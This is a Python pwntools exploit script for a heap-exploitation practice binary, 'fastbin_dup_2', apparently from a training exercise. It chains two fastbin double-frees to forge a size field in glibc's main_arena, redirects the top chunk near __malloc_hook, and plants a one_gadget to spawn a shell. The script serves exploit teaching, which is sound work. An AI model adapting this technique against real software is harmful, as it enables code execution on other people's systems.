#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup_2")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================


# Request two 0x50-sized chunks.
chunk_A = malloc(0x48, b"A"*8)
chunk_B = malloc(0x48, b"B"*8)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# Use the first double free to add 0x61 as a fake fastbin size field
# into the main arena this is due to the reason, that the main arena
# stores pointers to the individual fastbins.
malloc(0x48, p64(0x61))
malloc(0x48, "C"*8)
malloc(0x48, "D"*8)

chunk_E = malloc(0x58, "E"*8)
chunk_F = malloc(0x58, "F"*8)

free(chunk_F)
free(chunk_E)
free(chunk_F)

# Using the second double free to get a free chunk
# pointing into the main arena
# this will later on enable us to overwrite the top chunk
# pointer and therefore create an arbitrary write
# +0x20 is used, as this is the offset of our fake 0x61
# size field + 8
malloc(0x58, p64(libc.sym.main_arena + 0x20))
malloc(0x58, "C"*8)

# argv array, -s tells /bin/dash to read from stdin
malloc(0x58, "-s\0")

# Here we overwrite the top chunk pointer 
# and let it point just before the malloc hook, as
# malloc does a size check and the size field 
# of the pointer can't be larger as the original top_chunk_size or 0
malloc(0x58, b"I"*(8*6) + p64(libc.sym.__malloc_hook - 35))

# The next malloc shall not be served from a fastbin
# and hence use the previously overwritten top chunk pointer
# we calculate the offset to __malloc_hook and overwrite
# it with a one_gadget
malloc(0x38, b"A"*(0x23-2*8) + p64(libc.address + 0xe1fa1))

# to easily set a breakpoint at the one_gadget addr
print(f"Gadget Addr: {hex(libc.address + 0xe1fa1)}")

# Trigger the one_gadget through the __malloc_hook
malloc(0x18, b"")


# =============================================================================

io.interactive()
